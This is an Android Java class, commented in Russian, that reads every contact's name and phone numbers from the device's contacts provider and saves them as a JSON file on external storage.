package com.postal.omniscient.postal.reader.contact;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import com.postal.omniscient.postal.write.json.WriteToJsonFile;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Кдасс читает все контакты
 * Created by Александр on 13.04.2016.
 */
public class ReadContacts {

    private ContentResolver contentResolver;
    private Context context;
    private static String fileName = "contacts.json";
    private static String folder = "Contacts";
    private static String Msg = "MyMsg";
    private static String _id ="_id";
    private static String url = "content://com.android.contacts/contacts";
    private static String display_name = "display_name";
    private static String has_phone_number = "has_phone_number";
    private static String number = "data1";
    private static String contact_id = "contact_id";
    private static String phone_url = "content://com.android.contacts/data/phones";
    private int x=0,y=21;// сколько полей телефонов считывать, думаю все поместятса (21 поле)

    public ReadContacts(Context context) {
        this.contentResolver = context.getContentResolver();
        this.context = context;
    }

    public int getX() {
        return x;
    }

    public int getY() {
        return y;
    }

    /**
     * Читаем все контакты
     * Возвращяет 2х мерный массив типа String
     * массив [имя][телефоны]
     * Created by Александр on 13.04.2016.
     */
    private String[][] readContacts() {
        String [][] phone_contacts = null;
        try {
            Uri uri = Uri.parse(url);
            Uri phone_uri = Uri.parse(phone_url);
            ContentResolver cr = contentResolver;
            Cursor cur = cr.query(uri, //ContactsContract.Contacts.CONTENT_URI
                    null, null, null, null);

            x = cur.getCount();

            phone_contacts = new String[x][y];

            if (cur.getCount() > 0) {
                for (int i = 0; cur.moveToNext(); i++) {

                    String id = cur
                            .getString(cur.getColumnIndex(_id));//ContactsContract.Contacts._ID));
                    String name = cur
                            .getString(cur.getColumnIndex(display_name));//ContactsContract.Contacts.DISPLAY_NAME));
                    if (Integer.parseInt(cur.getString(cur.getColumnIndex
                            (has_phone_number))) > 0) {//ContactsContract.Contacts.HAS_PHONE_NUMBER
//                    Log.i(Msg,": name : " + name + ", ID : " + id);

                        phone_contacts[i][0] = name;

                        // get the phone number
                        Cursor pCur = cr.query(phone_uri, null, //ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                                contact_id + " = ?", //ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                new String[]{id}, null);
                        for (int k = 1; pCur.moveToNext(); k++) {
                            String phone = pCur.getString(
                                    pCur.getColumnIndex(number)); //ContactsContract.CommonDataKinds.Phone.NUMBER;
//                        Log.i(Msg,": phone : " + phone);
                            phone_contacts[i][k] = phone;
                        }
                        pCur.close();
                    }
                }
                cur.close();
            }
        }catch (Exception e){Log.i(Msg, "Error ReadContacts readContacts "+e);}
        return phone_contacts;
    }
    //получаем контакты и записываем в файл
    public void getContacts() {
        try {
            String[][] phone_contacts = readContacts();
            WriteToJsonFile write = new WriteToJsonFile(context);

            JSONArray number;//все номера телефонов одного контакта
            JSONObject name_and_phone;// имя и телефоны
            JSONArray person = new JSONArray();// массив с имени и телефонов
            JSONObject contacts = new JSONObject();//просто заголовок типа тут контакты, а не шпроты
            for (int i = 0; getX() > i; i++) {
                if (phone_contacts[i][0] != null) {

                    number = new JSONArray();
                    name_and_phone = new JSONObject();

                    for (int k = 1; getY() > k; k++) {
                        if (phone_contacts[i][k] != null) {

                            number.put(phone_contacts[i][k]);
//                    Log.i(Msg, " Json :"+i+" "+number.toString());
                        }
                    }

                    try {
                        name_and_phone.put("Names", phone_contacts[i][0]);//name);
                        name_and_phone.put("Phones", number);// phones);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    person.put(name_and_phone);
                }
            }
            try {
                contacts.put("Contacts", person);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            write.writeFileSD(contacts, fileName, folder);
        } catch (Exception e) {
            Log.i(Msg, "Error ReadContacts getContacts " + e);
        }
    }

}
